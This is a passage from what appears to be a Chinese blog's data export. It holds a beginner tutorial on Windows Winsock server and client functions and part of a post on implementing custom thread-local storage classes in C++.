一种套接字类型，提供可靠的消息数据报。 这种类型的一个示例是Windows中的实用通用多播（PGM）多播协议实现，通常称为可靠多播节目。 仅在安装了可靠多播协议时才支持此类型值。 SOCK_SEQPACKET 5 一种套接字类型，提供基于数据报的伪流数据包。 参数3 协议的类型 IPPROTO_TCP 传输控制协议（TCP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_STREAM时，这是一个可能的值。 IPPROTO_UDP 用户数据报协议（UDP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_DGRAM时，这是一个可能的值。 IPPROTO_ICMP Internet控制消息协议（ICMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_IGMP Internet组管理协议（IGMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_RM 用于可靠多播的PGM协议。 当af参数为AF_INET且类型参数为SOCK_RDM时，这是一个可能的值。 在针对Windows Vista及更高版本发布的Windows SDK上，此协议也称为IPPROTO_PGM。 仅在安装了可靠多播协议时才支持此协议值。 整理下 通过参数3得到一个事儿，参数1 2 3三者是配套的，是一套参数，不是随便填的，即使用不同的协议，那要添加对应的那套参数。 想要使用一个协议，咱们设备得支持才行，比如红外 参数3中，有个可能这个词，所以说一般，参数3可以填写0，系统会自动帮我们选择协议类型 返回值 成功返回可用的socket 不用了就一定要销毁套接字 closesocket(socketListen); 失败返回INVALID_SOCKET 关闭网络库 WSACleanup(); 可用WSAGetLasterror()返回错误码 绑定地址与端口 int bind( SOCKET s, const sockaddr *addr, int namelen ); 作用 给我们的socket绑定端口号与具体地址 地址 找到咱们的电脑 只有一个 端口号 找到我们机器上对应的软件，比如QQ，浏览器等等，都对应着自己的端口号 多个 每一种通信的端口号是唯一的 同一个软件可能占用多个端口号 参数1 上一个函数创建了socket，绑定了协议信息（地址类型，套接字类型，协议类型），咱们bind函数就是绑定实质的地址，端口号 参数2 结构体 地址类型 装IP地址 端口号 结构体类型 sockaddr 该参数使用方法 SOCKADDR_IN sockAddress; sockAddress.sin_family = AF_INET; sockAddress.sin_addr.s_addr = inet_addr(“127.0.0.1”); sockAddress.sin_port = 12345; (sockaddr*)&amp;sockAddress强转添加到参数2上 成员1 跟socket函数参数1是一样的 成员2 IP地址 192.168.xxx.xxx 可以在控制台输入指令 ipconfig 就能看到了 或者在网络设置中，能找到这个地址 我就不演示了，我不想让你们发现我 127.0.0.1 回送地址 本地回环地址 本地网络测试 参数3 端口号 本质 就是一个整数 0~65535 IP是我们机器的地址，端口就是我们具体的软件的通信口，一个软件可能会占用多个接口，比如一个软件可以聊天，可以下载，可以看视频…那么这些不同的通信内容，往往会有各自的协议，各自的端口。 IP是公司地址，端口就是各个部门的地址了 填写哪个值呢？ 理论上只要这个范围0~65535都可以 实际 介于0～1023，为系统保留占用端口号 21端口分配给FTP(文件传输协议)服务 25端口分配给SMTP（简单邮件传输协议）服务 80端口分配给HTTP服务 所以 我们不能写这个范围的 我们的范围就是1024~65535 稍微大点儿，1万多 但是注意一点，端口号是唯一的，比如1234已经被别的软件占用了，那么你再使用1234这个端口号，那么就会绑定失败，因为已经呗占用了 给大家演示下 那大家如何查看自己要用的端口号有没有被占用呢？ 打开运行cmd输入netstat -ano 查看被使用的所有端口 netstat -aon|findstr “12345” 检查我们要使用的端口号是否被使用了 使用了就会显示使用的程序，未被使用就啥都不显示 参数3 参数2的类型大小 sizeof(参数2) 返回值 成功返回0 失败返回SOCKET_ERROR 具体错误码通过int WSAGetLastError(void);获得 closesocket(socketListen); WSACleanup(); 开始监听 int WSAAPI listen( SOCKET s, int backlog ); 作用 将套接字置于正在侦听传入连接的状态。 参数1 服务器端的socket，也就是socket函数创建的 参数2 挂起连接队列的最大长度。 就是说，比如有100个用户链接请求，但是系统一次只能处理20个，那么剩下的80个不能不理人家，所以系统就创建个队列记录这些暂时不能处理，一会儿处理的链接请求，依先后顺序处理，那这个队列到底多大？就是这个参数设置，比如2，那么就允许两个新链接排队的。这个肯定不能无限大，那内存不够了。 我们可以手动设置这个参数，但是别大了。可能210多，20多。 我们一般填写这个参数 SOMAXCONN 作用是让系统自动选择最合适的个数 不同的系统环境不一样，所以这个合适的数也都不一样 WSAAPI 调用约定 这个我们可以忽略，这是给系统看的，跟咱们没关 决定三 函数名字的编译方式 参数的入栈顺序 函数的调用时间 返回值 成功 返回0 失败 SOCKET_ERROR 具体错误码 WSAGetLastError() 释放 closesocket(socketListen); WSACleanup(); 创建客户端socket/接受连接 SOCKET WSAAPI accept( SOCKET s, sockaddr *addr, int *addrlen ); 作用 accept函数允许在套接字上进行传入连接尝试。 listen监听客户端来的链接，accept讲客户端的信息绑定到一个socket上，也就是给客户端创建一个socket,通过返回值返回给我们客户端的socket 一次只能创建一个，有几个客户端链接，就要调用几次 参数1 我们上面创建的自己的socket socket先处于监听状态，然后来的链接都在由这个管理，我们取客户端的信息，就是通过这个我们自己的socket 参数2 客户端的地址端口信息结构体 跟bind的第二个参数一样 意义：系统帮我们监视着客户端的动态，肯定会记录客户端的信息，也就是IP地址，和端口号，并通过这个结构体记录 SOCKADDR_IN sockClient 这个我们不用填写，系统帮我们填写，也即传址调用 参数2 3也能都设置成NULL，那就是不直接得到客户端的地址，端口号咯 此时可以通过函数得到客户端信息 getpeername(newSocket, (struct sockaddr*)&amp;sockClient, &amp;nLen); 得到本地服务器信息 getsockname(sSocket, (sockaddr*)&amp;addr, &amp;nLen); 参数3 参数2的大小 sizeof 返回值 成功 返回值就是给客户端包好的socket 与客户端通信就靠这个 失败 返回INVALID_SOCKET WSAGetLastError()得到错误码 释放空间 closesocket(socketListen); WSACleanup(); accept调试 1、阻塞，同步 这个函数是阻塞的，没有客户端链接，那就一直卡在这儿，等着。 2、多个链接 一次只能一个，5个就要5次循环 理解缺点 与客户端收发消息 收 int recv( SOCKET s, char *buf, int len, int flags ); 作用 得到指定客户端（参数1）发来的消息 原理 本质：复制 数据的接收都是由协议本身做的，也就是socket的底层做的，系统会有一段缓冲区，存储着接收到的数据。 咱们外边调用recv的作用，就是通过socket找到这个缓冲区，并把数据复制进咱们的参数2，复制参数3个 参数1 客户端的socket，每个客户端对应唯一的socket 参数2 客户端消息的存储空间，也就是个字符数组 这个一般1500字节 网络传输得最大单元，1500字节，也就是客户端发过来得数据，一次最大就是1500字节，这是协议规定，这个数值也是根据很多情况，总结出来得最优值 所以客户端最多一组来1500字节，咱们这头1500读一次，够够的了。 参数3 想要读取得字节个数 一般是参数2得字节数-1，把\\0字符串结尾留出来 参数4 数据的读取方式 0 正常逻辑来说 我们从系统缓冲区把数据读到我们的buf,读到我们buf中后，系统缓冲区的被读的就应该被删除掉了，不然也是浪费空间，毕竟，通信时间长的话，那就爆炸了 我们将缓冲区的数据读到我们自己的buf，根据需要处理相应的数据，这是我们可控的，完全玩儿弄于咱么你自己的鼓掌，系统缓冲区的数据，咱们无可奈何，操作不了 读出来的就删除的话，有很多的好处 1、系统缓冲区读到的数据，比我们的buf多，那么我们读出来的，系统删掉，从而我们就可以依次的把所有数据读完了 比如 系统缓冲区收到abcdefghijk，咱们的recvbuf一次读4个字节，那么我们放循环里，就会依次读出abcd,efgh,ijk 如果不删，那每次都是从头读 在循环里就是每次都是abcd…只读到这四个 2、可以计数收到了多少字节 返回值就是本次读出来的数据 正常这种逻辑 填0 哈哈 读出来的就删除 MSG_PEEK 窥视传入的数据。 数据将复制到缓冲区中，但不会从输入队列中删除。 读出来的不删除 这个东西是不建议被使用的 第一、读数据不行 第二、那就无法计数了 MSG_OOB 带外数据 意义 就是传输一段数据，在外带一个额外的特殊数据 相当于小声BB 实际 就不建议被使用了 1、TCP协议规范（RFC 793）中OOB的原始描述被“主机要求”规范取代（ RFC 1122），但仍有许多机器具有RFC 793 OOB实现。 2、既然两种数据，那咱们就send两次，另一方recv两次就行了，何必搞得那么神神秘秘，浪费计算机精力 MSG_WAITALL 直到系统缓冲区字节数满足参数3所请求得字节数，才开始读取 返回值 读出来字节数大小 读没了咋办？ 在recv函数卡着，等着客户端发来数据 即阻塞，同步 阻塞的 客户端下线，这端返回0 释放客户端socket 执行失败，返回SOCKET_ERROR WSAGetLastError()得到错误码 根据错误码信息做相应处理 重启 等待 不用理会 发 int WSAAPI send( SOCKET s, const char *buf, int len, int flags ); 作用 向目标发送数据 本质 send函数将我们的数据复制黏贴进系统的协议发送缓冲区，计算机伺机发出去 最大传输单元是1500字节 参数1 目标的socket，每个客户端对应唯一的socket 参数2 给对方发送的字节串 这个不要超过1500字节 发送时候，协议要进行包装，加上协议信息，也叫协议头，或者叫包头，咱们在理论部分，会非常详细的介绍协议头，以及功能 这个大小不同的协议不一样，链路层14字节，ip头20字节，tcp头20字节，数据结尾还要有状态确认，加起来也几十个字节，所以实际咱们的数据位，不能写1500个，要留出来，那就1024吧，或者最多1400，就差不多了 懂这个大体原理就好 详细的包的封装原理，我们在后面纯理论部分介绍 当然大家这个不一定每次都是正好那么多字节，比如聊天，一句话就十个八个的汉字，别多于1400是最好的 超过1500系统咋办？ 系统会分片处理 比如2000个字节 系统分成两个包 1400+包头==1500 假设包头100字节 600+包头==700 分两次发送出去 结果 1、系统要给咱们分包再打包，再发送， 客户端接收到了还得拆包，组合数据。从而增加了系统的工作，降低效率 2、有的协议，就把分片后的二包直接丢了 参数3 字节个数 1400 参数4 写0就行了 其他 MSG_OOB 意义同recv 就不用使用了 带外数据 意义 就是传输一段数据，在外带一个额外的特殊数据 相当于小声BB 实际 就不建议被使用了 1、TCP协议规范（RFC 793）中OOB的原始描述被“主机要求”规范取代（ RFC 1122），但仍有许多机器具有RFC 793 OOB实现。 2、既然两种数据，那咱们就send两次，另一方recv两次就行了，何必搞得那么神神秘秘，浪费计算机精力 MSG_DONTROUTE 指定数据不应受路由限制。 Windows套接字服务提供程序可以选择忽略此标志。 返回值 成功返回写入的字节数 执行失败，返回SOCKET_ERROR WSAGetLastError()得到错误码 根据错误码信息做相应处理 重启 等待 不用理会 客户端 网络头文件 网络库 最底层的网络函数，大家用QT MFC wpf，或者百度下载的很多其他的封装好的网络库，都是对咱们讲的这些最本质的网络函数的二次封装，咱们讲的是通用的，讲完这个大家也可以自己封装函数库给别人用了。 #include &lt;WinSock2.h&gt; #pragma comment(lib,“ws2_32.lib”) 函数库 winsock2.h windows socket 第2版 第一版是 winsock.h 查看具体区别 目前网络库有哪些版本？ 1.0 1.1 2.0 2.1 2.2 演示MSDN 查这个函数的详细信息 WSAStartup 我们的开发环境支持哪个版本？ 打开头文件，看咱们当前编译器环境支持的最高版本 ws2_32.lib windows socket 第2版 32位 不管是64编译环境还是32编译环境，都是用这个，并没有ws2_64.dll wsock32.lib winsock.h 第一版网络库 对应的库文件 这里不区分大小写 打开网络库 int WSAStartup( WORD wVersionRequired, LPWSADATA lpWSAData ); 功能 打开网络库/启动网络库，启动了这个库，这个库里的函数/功能才能使用 w windows s socket a Asynchronous 异步 startup 启动 同步与异步 同步 阻塞/卡死状态 异步 多个工作同时进行 参数1 我们要使用的库的版本 类型是 WORD 转定义：unsigned short WORD wVersionRequired = MAKEWORD(2,2); MAKEWORD(主版本,副版本)， 1.0 2.2 wVersionRequired 数据高位/高地址是副版本 数据低位/低地址是主版本 用调试+计算器演示数据原理 位运算，内存操作，小端存储 参数2 LPWSADATA lpWSAData 系统通过这个参数给我们一些配置信息 注意 当看到参数有 LP P前缀的时候，是说我们这里要传对应类型变量的地址，这是win32API 的规范 或者叫规则 看下有哪些信息 struct WSAData { WORD wVersion; WORD wHighVersion; unsigned short iMaxSockets; unsigned short iMaxUdpDg; char *lpVendorInfo; char szDescription[WSADESCRIPTION_LEN + 1]; char szSystemStatus[WSASYS_STATUS_LEN + 1]; } wVersion 我们要使用的版本 wHighVersion 系统能提供给我们最高的版本 iMaxSockets 返回可用的socket的数量，2版本之后就没用了 iMaxUdpDg UDP数据报信息的大小，2版本之后就没用了 lpVendorInfo 供应商特定的信息，2版本之后就没用了 szDescription szSystemStatus 当前库的描述信息，2.0是第二版的意思 当输入的版本不存在 输入1.3， 2.3 有主版本，没有副版本 得到该主版本的最大副版本 1.1 2.2并使用 输入3.1 3.3 超过最大版本号 使用系统能提供的最大的版本 2.2 输入 0.0 0.1 0.3 主版本是0 网络库打开失败，不支持请求的套接字版本 返回值 返回0为执行正确 失败 这些宏的本质 WSASYSNOTREADY 10091 底层网络子系统尚未准备好进行网络通信。 系统配置问题，重启下电脑，检查ws2_32库是否存在，或者是否在环境配置目录下 WSAVERNOTSUPPORTED 10092 此特定Windows套接字实现不提供所请求的Windows套接字支持的版本。 要使用的版本不支持 WSAEPROCLIM 10067 已达到对Windows套接字实现支持的任务数量的限制。 Windows Sockets实现可能限制同时使用它的应用程序的数量 WSAEINPROGRESS 10036 正在阻止Windows Sockets 1.1操作。 当前函数运行期间，由于某些原因造成阻塞，会返回在这个错误码，其他操作均禁止 WSAEFAULT 10014 lpWSAData参数不是有效指针。 参数写错了 校验版本 2 != HIBYTE(wsaData.wVersion) || 2 != LOBYTE(wsaData.wVersion) HIBYTE是高位 副版本 LOBYTE是地位 主版本 逻辑 只要有一个不是2，说明系统不支持我们要的2.2版本 关闭库 并结束函数，可以给出相应提示 WSACleanup(); return 0； 创建SOCKET SOCKET socket( int af, int type, int protocol ); 作用 创建一个SOCKET SOCKET介绍 什么是socket 将底层复杂的协议体系，执行流程，进行了封装，封装完的结果，就是一个SOCKET了， 也就是说，SOCKET是我们调用协议进行通信的 操作接口 意义 将复杂的协议过程与我们编程人员分开，我们直接操作一个简单SOCKET就行了，对于底层的协议 过程细节，完全不用知道，这就大大方便了我们。 网络编程难就难在协议本身的复杂性，简单就简单在我们编程层面完全不用考虑哪些 本质 就是一种数据类型，转定义看下类型 就是一个整数 uint 但是这个数是唯一的 标识着我当前的应用程序，协议特点等信息 ID，门牌号 应用 我们网络通信的函数，全部都要使用SOCKET 演示 逻辑 每个客户端有一个SOCKET，服务器有一个SOCKET，通信时候，就需要这个SOCKET做参数，给谁通信，就要传递谁的SOCKET 所以 网络编程，理论层面SOCKET是网络封装的精华，代码层面就是不停的使用SOCKET这个变量，所以又叫SOCKET编程 参数1 地址的类型 比如大家联系我 手机 15512345678 固定电话 7881234 ＱＱ 40916626 微信 c3_xin666 找上门 内蒙古 xxxxxxx … AF_INET 2 ipv4 Internet协议版本4（IPv4）地址系列。 192.168.1.103 0.0.0.0 ~ 255.255.255.255 点分十进制表示法 4字节 32位的地址 个数快不够 就是无符号int类型的范围 0 ~ 4294967295 AF_INET6 23 ipv6 Internet协议版本6（IPv6）地址系列。 2001:0:3238:DFE1:63::FEFB 16字节 128位的地址 这个地球每寸一个IP AF_BTH 32 蓝牙地址系列。 如果计算机安装了蓝牙适配器和驱动程序，则Windows XP SP2或更高版本支持此地址系列。 6B:2D:BC:A9:8C:12 AF_IRDA 26 红外数据协会（IrDA）地址系列。 仅当计算机安装了红外端口和驱动程序时，才支持此地址系列。 通信地址不仅仅只有IP地址 参数2 套接字类型 SOCK_STREAM 1 一种套接字类型，提供带有OOB数据传输机制的顺序，可靠，双向，基于连接的字节流。 此套接字类型使用传输控制协议（TCP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_DGRAM 2 一种支持数据报的套接字类型，它是固定（通常很小）最大长度的无连接，不可靠的缓冲区。 此套接字类型使用用户数据报协议（UDP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_RAW 3 一种套接字类型，提供允许应用程序操作下一个上层协议头的原始套接字。 要操作IPv4标头，必须在套接字上设置IP_HDRINCL套接字选项。 要操作IPv6标头，必须在套接字上设置IPV6_HDRINCL套接字选项。 SOCK_RDM 4 一种套接字类型，提供可靠的消息数据报。 这种类型的一个示例是Windows中的实用通用多播（PGM）多播协议实现，通常称为可靠多播节目。 仅在安装了可靠多播协议时才支持此类型值。 SOCK_SEQPACKET 5 一种套接字类型，提供基于数据报的伪流数据包。 参数3 协议的类型 IPPROTO_TCP 传输控制协议（TCP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_STREAM时，这是一个可能的值。 IPPROTO_UDP 用户数据报协议（UDP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_DGRAM时，这是一个可能的值。 IPPROTO_ICMP Internet控制消息协议（ICMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_IGMP Internet组管理协议（IGMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_RM 用于可靠多播的PGM协议。 当af参数为AF_INET且类型参数为SOCK_RDM时，这是一个可能的值。 在针对Windows Vista及更高版本发布的Windows SDK上，此协议也称为IPPROTO_PGM。 仅在安装了可靠多播协议时才支持此协议值。 整理下 通过参数3得到一个事儿，参数1 2 3三者是配套的，是一套参数，不是随便填的，即使用不同的协议，那要添加对应的那套参数。 想要使用一个协议，咱们设备得支持才行，比如红外 参数3中，有个可能这个词，所以说一般，参数3可以填写0，系统会自动帮我们选择协议类型 返回值 成功返回可用的socket 不用了就一定要销毁套接字 closesocket(socketListen); 失败返回INVALID_SOCKET 关闭网络库 WSACleanup(); 可用WSAGetLasterror()返回错误码 链接到服务器 int WSAAPI connect ( SOCKET s, const sockaddr *name, int namelen ); 作用 链接服务器并把服务器信息与服务器socket绑定到一起 参数1 服务器socket 参数2 服务器Ip地址端口号结构体 参数3 参数2结构体大小 返回值 成功 返回0 失败 返回 SOCKET_ERROR WSAGetLastError()得到错误码 释放空间 closesocket(socketListen); WSACleanup(); 与服务器收发消息 收 recv(newSocket, szRecvBuffer, sizeof(szRecvBuffer), 0); 参数1 参数2 参数3 参数4 返回值 发 send(newSocket, szSendBuffer, strlen(szSendBuffer)+1, 0); 参数1 参数2 参数3 参数4 返回值 思考 加个循环，稍微完善下逻辑 问题 由于accept recv是阻塞的，做其中一件事，另外一件事就做不了，所以假设有多个客户端的情况下， 我们当前的模型，我先等，我不管及将来的是什么请求，我先等 结果：咱们在这等收消息recv，结果来了个链接请求，那就无法处理，链接只能accept 另外，我们等的socket可能没有发请求，那我们完了，等到睡着。 从而，我这个服务器，就是废了 分析 我们直接主动跟系统要，要什么？要有请求的socket，哪个有请求了，就给我哪个 结果： 得到链接请求，我们就直接accept 得到是发来了消息，我们就recv 从而就不会发生无谓的傻等情况 得到 select模型 select就是挑选的意思，它把请求的套接字给我们选出来，我们直接就去处理这些套接字 即：select就是处理accept与recv阻塞问题的 send本身也是阻塞的，不是长阻塞，是短阻塞","categories":[{"name":"Windows网络编程","slug":"Windows网络编程","permalink":"https://xiaowuyoucy.github.io/categories/Windows网络编程/"}],"tags":[]},{"title":"设计自己的线程局部存储","slug":"win0004-设计自己的线程局部存储","date":"2021-05-28T01:31:12.000Z","updated":"2021-06-08T14:34:41.327Z","comments":true,"path":"2021/05/28/win0004-设计自己的线程局部存储/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/05/28/win0004-设计自己的线程局部存储/","excerpt":"","text":"设计自己的线程局部存储 （1）自动管理它所保存的指针所指向的内存单元的分配和释放。这样做，一方面大大方 便了用户使用，另一方面，在一个线程不使用线程局部变量的情况下，管理系统可以决定不为 这个线程分配内存，从而节省内存空间。 （2）允许用户申请使用任意多个TLS索引。Microsoft确保每个进程的位数组中至少有TLS_MINIMUM_AVAILABLE个位标志是可用的。在WinNTh文件中这个值被定义为64，Windows 2000又做了扩展，使至少1000个标志可用。 新的TLS主要由4个类组成 CSimpleList类负责实现简单的链表功能，把各线程私有数据连在一起，以便能够释放它们占用的内存； CNoTrackObject类重载了new和delete操作符，负责为线程私有数据分配内存空间； CThreadSlotData类是整个系统的核心，它负责分配索引和存取线程私有数据； CThreadLocal是最终提供给用户使用的类模板，它负责为用户提供友好的接口函数。 线程的私有数据是自己自定义的结构或类,需要继承CNoTrackObject类 一个存放线程私有数据的数据结构CThreadData 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208///////////////////////////////////////////////////////// _AFXTLS_.H文件#ifndef __AFXTLS_H__ // _AFXTLS_.H 文件#define __AFXTLS_H__#include &lt;windows.h&gt;#include &lt;stddef.h&gt;class CNoTrackObject;////////////////////////////////////////////////// CSimpleListclass CSimpleList&#123;public://构造函数 CSimpleList(int nNextOffset = 0); //设置数据结构中pNext成员的偏移量 void Construct(int nNextOffset);// 提供给用户的接口函数（Operations），用于添加、删除和遍历节点 BOOL IsEmpty() const; //判断是否为空链表 void AddHead(void* p); //添加节点 void RemoveAll(); //删除所有结点 void* GetHead() const; //获取头结点 void* GetNext(void* p) const; //获取下一个结点 BOOL Remove(void* p); //删除结点// 为实现接口函数所需的成员（Implementation） void* m_pHead; // 链表中第一个元素的地址 size_t m_nNextOffset; // 数据结构中pNext成员的偏移量 void** GetNextPtr(void* p) const; //获取pNext的偏移地址&#125;;// 类的内联函数inline CSimpleList::CSimpleList(int nNextOffset)&#123; m_pHead = NULL; m_nNextOffset = nNextOffset; &#125;//设置数据结构中pNext成员的偏移量inline void CSimpleList::Construct(int nNextOffset)&#123; m_nNextOffset = nNextOffset; &#125;//判断链表为空,返回NULLinline BOOL CSimpleList::IsEmpty() const&#123; return m_pHead == NULL; &#125;//移除所有结点inline void CSimpleList::RemoveAll()&#123; m_pHead = NULL; &#125;//获取头节点inline void* CSimpleList::GetHead() const&#123; return m_pHead; &#125;//获取下一个结点的地址inline void* CSimpleList::GetNext(void* preElement) const&#123; return *GetNextPtr(preElement); &#125;//获取数据结构中pNext成员的偏移量inline void** CSimpleList::GetNextPtr(void* p) const&#123; return (void**)((BYTE*)p + m_nNextOffset); &#125;template&lt;class TYPE&gt;class CTypedSimpleList : public CSimpleList&#123;public: CTypedSimpleList(int nNextOffset = 0) : CSimpleList(nNextOffset) &#123; &#125; void AddHead(TYPE p) &#123; CSimpleList::AddHead((void*)p); &#125; TYPE GetHead() &#123; return (TYPE)CSimpleList::GetHead(); &#125; TYPE GetNext(TYPE p) &#123; return (TYPE)CSimpleList::GetNext(p); &#125; BOOL Remove(TYPE p) &#123; return CSimpleList::Remove(p); &#125; operator TYPE() &#123; return (TYPE)CSimpleList::GetHead(); &#125;&#125;;////////////////////////////////////////////////// CNoTrackObjectclass CNoTrackObject&#123;public: void* operator new(size_t nSize); void operator delete(void*); virtual ~CNoTrackObject() &#123; &#125;&#125;;/////////////////////////////////////////////////// CThreadSlotData - 管理我们自己的线程局部存储// warning C4291: no matching operator delete found#pragma warning(disable : 4291) struct CSlotData;struct CThreadData;class CThreadSlotData&#123;public: CThreadSlotData();// 提供给用户的接口函数（Operations） int AllocSlot(); void FreeSlot(int nSlot); void* GetThreadValue(int nSlot); void SetValue(int nSlot, void* pValue); void DeleteValues(HINSTANCE hInst, BOOL bAll = FALSE);// 类的实现代码（Implementations） DWORD m_tlsIndex; // 用来访问系统提供的线程局部存储 int m_nAlloc; // m_pSlotData所指向数组的大小 int m_nRover; // 为了快速找到一个空闲的槽而设定的值 int m_nMax; // CThreadData结构中pData指向的数组的大小 CSlotData* m_pSlotData; // 标识每个槽状态的全局数组的首地址 CTypedSimpleList&lt;CThreadData*&gt; m_list; // CThreadData结构的列表 CRITICAL_SECTION m_cs; void* operator new(size_t, void* p) &#123; return p; &#125; void DeleteValues(CThreadData* pData, HINSTANCE hInst); ~CThreadSlotData();&#125;;///////////////////////////////////////////////class CThreadLocalObject&#123;public:// 属性成员(Attributes)，用于取得保存在线程局部的变量中的指针 CNoTrackObject* GetData(CNoTrackObject* (*pfnCreateObject)()); CNoTrackObject* GetDataNA();// 具体实现(Implementation) DWORD m_nSlot; ~CThreadLocalObject();&#125;;template&lt;class TYPE&gt;class CThreadLocal : public CThreadLocalObject&#123;// 属性成员（Attributes）public: TYPE* GetData() &#123; TYPE* pData = (TYPE*)CThreadLocalObject::GetData(&amp;CreateObject); return pData; &#125; TYPE* GetDataNA() &#123; TYPE* pData = (TYPE*)CThreadLocalObject::GetDataNA(); return pData; &#125; operator TYPE*() &#123; return GetData(); &#125; TYPE* operator-&gt;() &#123; return GetData(); &#125;// 具体实现（Implementation）public: static CNoTrackObject* CreateObject() &#123; return new TYPE; &#125;&#125;;#define THREAD_LOCAL(cla.ss_name, ident_name) \\ CThreadLocal&lt;class_name&gt; ident_name;#define EXTERN_THREAD_LOCAL(class_name, ident_name) \\ extern THREAD_LOCAL(class_name, ident_name)#endif // __AFXTLS_H__/*2.2.4 #ifndef __AFXTLS_H__ // _AFXTLS_.H 文件#define __AFXTLS_H__#include &lt;windows.h&gt;class CThreadLocalObject&#123;public: CThreadLocalObject();// 属性成员(Attributes)，用于取得保存在线程局部的变量中的指针 LPVOID GetData(LPVOID (*pfnCreateObject)()); LPVOID GetDataNA();// 执行体(Implementation)，实现类接口所需的成员 DWORD m_tlsIndex; ~CThreadLocalObject(); &#125;;#endif // __AFXTLS_H__ */ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341///////////////////////////////////////////////////////// AFXTLS.CPP文件#include \"_AFXTLS_.H\"//------------------CSimpleList类---------------------------//添加节点void CSimpleList::AddHead(void* p)&#123; *GetNextPtr(p) = m_pHead; m_pHead = p;&#125;//删除结点BOOL CSimpleList::Remove(void* p)&#123; if(p == NULL) // 检查参数 return FALSE; BOOL bResult = FALSE; // 假设移除失败 if(p == m_pHead) &#123; // 要移除头元素 m_pHead = *GetNextPtr(p); bResult = TRUE; &#125; else &#123; // 试图在表中查找要移除的元素 void* pTest = m_pHead; while(pTest != NULL &amp;&amp; *GetNextPtr(pTest) != p) pTest = *GetNextPtr(pTest); // 如果找到，就将元素移除 if(pTest != NULL) &#123; *GetNextPtr(pTest) = *GetNextPtr(p); bResult = TRUE; &#125; &#125; return bResult;&#125;//-------------------CThreadSlotData类----------------------//BYTE __afxThreadData[sizeof(CThreadSlotData)]; // 为下面的_afxThreadData变量提供内存CThreadSlotData* _afxThreadData; // 定义全局变量_afxThreadData来为全局变量分配空间//槽状态结构struct CSlotData&#123; DWORD dwFlags; // 槽的使用标志（被分配/未被分配） HINSTANCE hInst;// 占用此槽的模块句柄&#125;;//链表节点结构struct CThreadData : public CNoTrackObject&#123; CThreadData* pNext; // CSimpleList类要使用此成员 int nCount; // 数组元素的个数 LPVOID* pData; // 数组的首地址&#125;;#define SLOT_USED 0x01 // CSlotData结构中dwFlags成员的值为0x01时表示该槽已被使用//构造函数,前期的初始化CThreadSlotData::CThreadSlotData()&#123; m_list.Construct(offsetof(CThreadData, pNext)); // 初始化CTypedSimpleList对象 m_nMax = 0; m_nAlloc = 0; m_nRover = 1; // 我们假定Slot1还未被分配（第一个槽（Slot0）总是保留下来不被使用） m_pSlotData = NULL; m_tlsIndex = ::TlsAlloc(); // 使用系统的TLS申请一个索引 ::InitializeCriticalSection(&amp;m_cs); // 初始化关键段变量&#125;//在位数组上获取可用的槽号int CThreadSlotData::AllocSlot()&#123; ::EnterCriticalSection(&amp;m_cs); // 进入临界区（也叫关键段） int nAlloc = m_nAlloc; int nSlot = m_nRover; //如果当前要使用的槽号大于位数组个数,或当前槽号已经被使用 if(nSlot &gt;= nAlloc || m_pSlotData[nSlot].dwFlags &amp; SLOT_USED) &#123; // 搜索m_pSlotData，查找空槽（SLOT） for(nSlot = 1; nSlot &lt; nAlloc &amp;&amp; m_pSlotData[nSlot].dwFlags &amp; SLOT_USED; nSlot ++) ; // 如果不存在空槽，申请更多的空间 if(nSlot &gt;= nAlloc) &#123; // 增加全局数组的大小，分配或再分配内存以创建新槽 int nNewAlloc = nAlloc + 32; HGLOBAL hSlotData; if(m_pSlotData == NULL) // 第一次使用 &#123; hSlotData = ::GlobalAlloc(GMEM_MOVEABLE, nNewAlloc*sizeof(CSlotData)); &#125; else &#123; //获取当前位数组的句柄 hSlotData = ::GlobalHandle(m_pSlotData); //位数组从物理内存中解除 ::GlobalUnlock(hSlotData); //重新设置位数组的大小 hSlotData = ::GlobalReAlloc(hSlotData, nNewAlloc*sizeof(CSlotData), GMEM_MOVEABLE); &#125; //将位数组绑定到物理内存中 CSlotData* pSlotData = (CSlotData*)::GlobalLock(hSlotData); // 将新申请的空间初始化为0 memset(pSlotData + m_nAlloc, 0, (nNewAlloc - nAlloc)*sizeof(CSlotData)); m_nAlloc = nNewAlloc; m_pSlotData = pSlotData; &#125; &#125; // 调整m_nMax的值，以便为各线程的私有数据分配内存 if(nSlot &gt;= m_nMax) m_nMax = nSlot + 1; m_pSlotData[nSlot].dwFlags |= SLOT_USED; // 更新m_nRover的值(我们假设下一个槽未被使用) m_nRover = nSlot + 1; ::LeaveCriticalSection(&amp;m_cs); return nSlot; // 返回的槽号可以被FreeSlot, GetThreadValue, SetValue函数使用了&#125;void CThreadSlotData::FreeSlot(int nSlot)&#123; ::EnterCriticalSection(&amp;m_cs); // 删除所有线程中的数据 CThreadData* pData = m_list; while(pData != NULL) &#123; if(nSlot 